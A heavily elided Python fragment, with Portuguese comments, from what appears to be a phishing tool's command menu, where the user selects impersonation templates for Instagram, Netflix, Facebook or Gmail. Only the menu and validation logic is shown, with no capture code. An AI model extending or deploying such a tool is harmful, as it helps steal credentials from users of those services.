     ...
     while (True):
        ...
        if (not prompt): #Se nada foi digitado, continue a execução
         ...
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
          ...
          print ("\n" +  C + "Comando:" + W + " set template (instagram,netflix,gmail) " + C + "=> " + R + "setar um Template")
          ...
          try:
            ...
            if (template_phishing == "instagram" or template_phishing == "netflix" or template_phishing == "gmail"):
              continue
            else:
   ...
   while (True):
        ...
        if (not prompt):
         ...
         try:
          ...
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "facebook" or template_phishing == "gmail"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
